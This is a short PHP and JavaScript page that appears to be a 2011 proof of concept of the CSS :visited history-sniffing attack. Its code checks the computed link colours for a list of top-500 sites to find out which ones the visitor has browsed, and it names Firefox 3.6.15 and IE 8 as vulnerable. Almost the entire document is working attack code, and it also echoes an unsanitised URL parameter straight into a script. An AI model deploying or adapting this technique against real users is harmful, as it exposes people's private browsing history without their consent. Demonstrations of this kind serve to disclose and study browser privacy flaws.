<? 
$s1 = 'rgb(1, 2,3)'; //style 1 The spacing is critically important here.
$s2 = 'rgb(88, 88, 88)'; //style 2
$s3 = 'rgb(88,88,88)'; //style 2 for ie
$l = 1;
if (isset($_GET['l']))
{
	$l = $_GET['l'];
}

?>
<html>
<head><style>h1 {background-color: #888888;} a {color: <? echo($s1) ?>; font-size: 30px;} a:visited{color: <? echo($s2) ?>; font-size: 16px;} </style></head>
<body>
<h1>CSS History Attack - You've visited the following sites (from a list of the top 500)</h1>
<h2>Firefox 3.6.15 and IE 8.0.7600.16385 are vulnerable, Chrome is not as of March 12, 2011</h2>
See <a href="http://whattheinternetknowsaboutyou.com">What the Internet Knows About You</a> for a more extensive version of this privacy attack.

<div id="results1"></div><br><div id="results2"></div></br>
<!--For debugging: if you've visited Google and your browser is vulnerable, the first link should look different than the second one (except IE, which is also vulnerable).


<a href="http://google.com" id="link1">Google</a>
<a href="http://fakesite.com" id="link2">fakesite.com</a> -->
</body>
</html>
<script type="text/javascript">
var sitesText = "<?echo(file_get_contents('top500.txt'));?>";
var sites = sitesText.split(',');

function e(x) {return document.getElementById(x);}
IE = true;
if (document.defaultView)
{
	IE = false;
}
var a = document.createElement('a');
//a.href = 'http://google.com';
document.body.appendChild(a);

for (l = 0; l< <? echo($l); ?>; l++) //optional loop for performance testing
{
	for (i=0; i<sites.length; i++)
	{
		
		if (IE)
		{
			var d = document.createElement('a');
			d.href = "http://www." + sites[i];
			//d.innerHTML = "f ";
			document.body.appendChild(d);
			if (d.currentStyle.color == '<?echo($s3)?>' )
			{
				results1.innerHTML += d.href+"<br>";
			}
		}
		else
		{
			a.href = "http://www." + sites[i];
			if (document.defaultView.getComputedStyle(a,null).getPropertyValue('color') == '<?echo($s2)?>' )
			{
				results1.innerHTML += a.href+"<br>";
			}
		}
	}
}


//e('results1').innerHTML = aStyle;
//e('results2').innerHTML = bStyle;
var link1 = e('link1');
var link2 = e('link2');
</script>